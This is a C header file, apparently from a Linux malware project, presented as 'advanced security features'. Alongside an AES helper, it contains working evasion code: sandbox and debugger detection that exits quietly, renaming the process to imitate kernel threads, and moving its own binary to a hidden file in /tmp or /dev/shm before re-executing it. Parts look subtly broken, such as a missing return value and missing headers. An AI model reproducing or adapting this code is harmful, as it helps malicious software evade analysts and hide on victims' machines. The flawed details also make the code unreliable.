// 𝖠𝖣𝖵𝖠𝖭𝖢𝖤𝖣 𝖲𝖤𝖢𝖴𝖱𝖨𝖳𝖸 𝖥𝖤𝖠𝖳𝖴𝖱𝖤𝖲
#pragma once
#include <sys/stat.h>
#include <fcntl.h>
#include <openssl/evp.h>

// 𝖠𝖣𝖵𝖠𝖭𝖢𝖤𝖣 𝖤𝖭𝖢𝖱𝖸𝖯𝖳𝖨𝖮𝖭
void aes_encrypt(const unsigned char *plaintext, int plaintext_len, 
                unsigned char *key, unsigned char *iv, 
                unsigned char *ciphertext) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    int len;
    int ciphertext_len;

    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);
    EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len);
    ciphertext_len = len;
    EVP_EncryptFinal_ex(ctx, ciphertext + len, &len);
    ciphertext_len += len;
    EVP_CIPHER_CTX_free(ctx);
}

// 𝖠𝖭𝖳𝖨-𝖠𝖭𝖠𝖫𝖸𝖲𝖨𝖲 𝖳𝖤𝖢𝖧𝖭𝖨𝖰𝖴𝖤𝖲
void anti_analysis() {
    // 𝖢𝗁𝖾𝖼𝗄 𝖿𝗈𝗋 𝖼𝗈𝗆𝗆𝗈𝗇 𝖽𝖾𝖻𝗎𝗀𝗀𝖾𝗋𝗌/𝗌𝖺𝗇𝖽𝖻𝗈𝗑𝖾𝗌
    if(getenv("LD_PRELOAD") != NULL) _exit(0);
    if(getenv("PYTHONPATH") != NULL) _exit(0);
    if(getenv("DEBUG") != NULL) _exit(0);
    
    // 𝖢𝗁𝖾𝖼𝗄 𝖿𝗈𝗋 𝗏𝗂𝗋𝗍𝗎𝖺𝗅𝗂𝗓𝖾𝖽 𝖾𝗇𝗏𝗂𝗋𝗈𝗇𝗆𝖾𝗇𝗍𝗌
    FILE *cpuinfo = fopen("/proc/cpuinfo", "r");
    if(cpuinfo) {
        char line[256];
        while(fgets(line, sizeof(line), cpuinfo)) {
            if(strstr(line, "hypervisor") || strstr(line, "QEMU") || 
               strstr(line, "VMware") || strstr(line, "VirtualBox")) {
                fclose(cpuinfo);
                _exit(0);
            }
        }
        fclose(cpuinfo);
    }
}

// 𝖯𝖱𝖮𝖢𝖤𝖲𝖲 𝖲𝖳𝖤𝖠𝖫𝖳𝖧
void hide_process() {
    char *fake_names[] = {
        "[kworker/0:0]", "[kworker/1:1]", "[ksoftirqd/0]", 
        "[migration/0]", "[rcu_sched]", "[watchdog/0]",
        "systemd-udevd", "systemd-journal", "systemd-timesyncd"
    };
    int name_index = rand() % (sizeof(fake_names)/sizeof(fake_names[0]));
    prctl(PR_SET_NAME, (unsigned long)fake_names[name_index], 0, 0, 0);
}

// 𝖥𝖨𝖫𝖤𝖲𝖸𝖲𝖳𝖤𝖬 𝖲𝖳𝖤𝖠𝖫𝖳𝖧
void hide_binary() {
    char path[PATH_MAX];
    char new_path[PATH_MAX];
    
    // 𝖱𝖺𝗇𝖽𝗈𝗆𝗂𝗓𝖾 𝖻𝗂𝗇𝖺𝗋𝗒 𝗇𝖺𝗆𝖾
    char *dirs[] = {"/tmp", "/var/tmp", "/dev/shm", "/run/shm"};
    char *names[] = {"systemd", "udevd", "kworker", "irqbalance"};
    
    int dir_idx = rand() % (sizeof(dirs)/sizeof(dirs[0]));
    int name_idx = rand() % (sizeof(names)/sizeof(names[0]));
    
    snprintf(new_path, sizeof(new_path), "%s/.%s.%d", 
             dirs[dir_idx], names[name_idx], rand() % 10000);
    
    // 𝖬𝗈𝗏𝖾 𝖻𝗂𝗇𝖺𝗋𝗒
    readlink("/proc/self/exe", path, sizeof(path));
    rename(path, new_path);
    
    // 𝖱𝖾-𝖾𝗑𝖾𝖼 𝗐𝗂𝗍𝗁 𝗇𝖾𝗐 𝗉𝖺𝗍𝗁
    execl(new_path, new_path, NULL);
}